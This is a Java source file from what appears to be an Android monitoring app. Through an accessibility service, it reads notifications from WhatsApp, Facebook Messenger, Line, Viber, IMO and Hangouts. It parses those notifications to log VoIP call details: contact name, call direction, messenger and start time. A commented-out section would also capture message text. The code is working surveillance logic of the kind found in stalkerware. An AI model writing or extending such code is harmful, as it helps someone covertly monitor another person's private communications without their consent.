package com.im.bin.accessibility.data;

import android.app.Notification;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcelable;
import android.text.TextUtils;

import com.im.bin.accessibility.AccessibilityUtil;
import com.im.bin.enums.IMType;
import com.im.bin.interfaces.OnAccessibilityEvent;
import com.im.bin.models.AccessibilityEventModel;

import timber.log.Timber;

import static com.im.bin.accessibility.AccessibilityUtil.isIncomingVoipCaptured;
import static com.im.bin.accessibility.AccessibilityUtil.isOutgoingVoipCaptured;
import static com.im.bin.accessibility.AccessibilityUtil.voipDirection;
import static com.im.bin.accessibility.AccessibilityUtil.voipMessener;
import static com.im.bin.accessibility.AccessibilityUtil.voipName;
import static com.im.bin.accessibility.AccessibilityUtil.voipNumber;
import static com.im.bin.accessibility.AccessibilityUtil.voipStartTime;
import static com.im.bin.accessibility.AccessibilityUtil.voipType;


public class NotificationStateChangedData implements OnAccessibilityEvent {

    @Override
    public void onAccessibilityEvent(Context context, AccessibilityEventModel accessibilityEventModel) {
        try {
            String packageName = accessibilityEventModel.getPackageName();
            String eventClassName = accessibilityEventModel.getEventClassName();
            String eventText = accessibilityEventModel.getEventText();
            Parcelable data = accessibilityEventModel.getParcelable();

            if (data instanceof Notification) {
                Notification notification = (Notification) data;
                CharSequence tickerText = notification.tickerText;
                Timber.d("Notify Ticker Text: %s", tickerText);

                Bundle extras = notification.extras;
                String extraTitle = extras.getString(Notification.EXTRA_TITLE);
                String extraText = extras.getString(Notification.EXTRA_TEXT);
                String extraBigText = "";
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    CharSequence chars = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
                    if (chars != null && !TextUtils.isEmpty(chars)) {
                        extraBigText = chars.toString();
                    }
                }

                Timber.d("Notify Extra Title: %s", extraTitle);
                Timber.d("Notify Extra Text: %s", extraText);
                Timber.d("Notify Extra BigText: %s", extraBigText);

                if (packageName.equals("com.facebook.orca")) {
                    if (extraText != null) {
                        extraText = extraText.toLowerCase();
                        if (extraText.contains("calling from") || extraText.contains("video chatting")) {
                            setVoipCallParam(extraTitle, "incoming", IMType.Facebook.toString(), "");
                        } else if (extraText.contains("tap to return") || extraText.contains("contacting")) {
                            setVoipCallParam(extraTitle, "outgoing", IMType.Facebook.toString(), "");
                        }
                    }
                } else if (packageName.equals("com.whatsapp")) {
                    if (extraText != null) {
                        extraText = extraText.toLowerCase();
                        if (extraText.contains("incoming")) {
                            setVoipCallParam(extraTitle, "incoming", IMType.WhatsApp.toString(), "");
                        } else if (extraText.contains("calling")) {
                            setVoipCallParam(extraTitle, "outgoing", IMType.WhatsApp.toString(), "");
                        }
                    }
                } else if (packageName.equals("jp.naver.line.android")) {
                    if (eventText.contains(":")) {
                        String[] arr = eventText.split(":");
                        String name = arr[0].trim();
                        String callText = arr[1].toLowerCase().trim();
                        name = name.replace("[", "");
                        if (callText.contains("incoming")) {
                            setVoipCallParam(name, "incoming", IMType.Line.toString(), "");
                        } else if (callText.contains("making")) {
                            setVoipCallParam(name, "outgoing", IMType.Line.toString(), "");
                        }
                    }
                } else if (packageName.equals("com.viber.voip")) {
                    extraBigText = extraBigText.toLowerCase();
                    if (extraBigText.contains("incoming viber")) {
                        setVoipCallParam(extraTitle, "incoming", IMType.Viber.toString(), "");
                    } else if (extraBigText.contains("outgoing viber")) {
                        setVoipCallParam(extraTitle, "outgoing", IMType.Viber.toString(), "");
                    }
                } else if (packageName.equals("com.imo.android.imoim")) {
                    if (extraText != null)
                        extraText = extraText.replace("with ", "");
                    if (extraTitle != null) {
                        extraTitle = extraTitle.toLowerCase();
                        if (extraTitle.contains("incoming imo")) {
                            setVoipCallParam(extraText, "incoming", IMType.IMO.toString(), "");
                        } else if (extraTitle.contains("ongoing imo")) {
                            setVoipCallParam(extraText, "outgoing", IMType.IMO.toString(), "");
                        }
                    }
                } else if (packageName.equals("com.google.android.talk")) {
                    if (extraText != null && extraTitle != null) {
                        extraText = extraText.toLowerCase();
                        extraTitle = extraTitle.toLowerCase();
                        if (extraTitle.contains("ongoing")) {
                            setVoipCallParam(AccessibilityUtil.hangOutConversationName, "outgoing", IMType.Hangouts.toString(), "");
                        } else if (extraText.contains("incoming")) {
                            setVoipCallParam(extraTitle, "incoming", IMType.Hangouts.toString(), "");
                        }
                    }
                } else if (!AccessibilityUtil.isVOIPModeRinging(context) && !AccessibilityUtil.isVOIPModeActive(context)) {
                    voipName = "";
                    voipNumber = "";
                    voipDirection = "";
                    voipMessener = "";
                    voipType = "";
                    voipStartTime = 0L;
                    isOutgoingVoipCaptured = false;
                    isIncomingVoipCaptured = false;
                }

//                Parcelable b[] = (Parcelable[]) extras.get(Notification.EXTRA_MESSAGES);
//                if (b != null) {
//                    String content = "";
//                    for (Parcelable tmp : b) {
//
//                        Bundle msgBundle = (Bundle) tmp;
//                        content = content + msgBundle.getString("text") + "\n";
//
//                        /*Set<String> io = msgBundle.keySet(); // To get the keys available for this bundle*/
//
//                    }
//                }
//
//                CharSequence[] lines =
//                        extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES);
//                if (lines != null && lines.length > 0) {
//                    StringBuilder sb = new StringBuilder();
//                    for (CharSequence msg : lines)
//                        if (!TextUtils.isEmpty(msg)) {
//                            sb.append(msg.toString());
//                            sb.append('\n');
//                        }
//                }
            }
        } catch (Exception e) {
            Timber.d("OnNotificationChangedError: %s", e.getMessage());
        }
    }

    private void setVoipCallParam(String extraTitle, String direction, String messenger, String number) {
        voipName = extraTitle;
        voipDirection = direction;
        voipMessener = messenger;
        voipStartTime = System.currentTimeMillis();
        voipNumber = "";
        if (direction.equals("incoming"))
            isIncomingVoipCaptured = true;
        else
            isOutgoingVoipCaptured = true;
    }
}
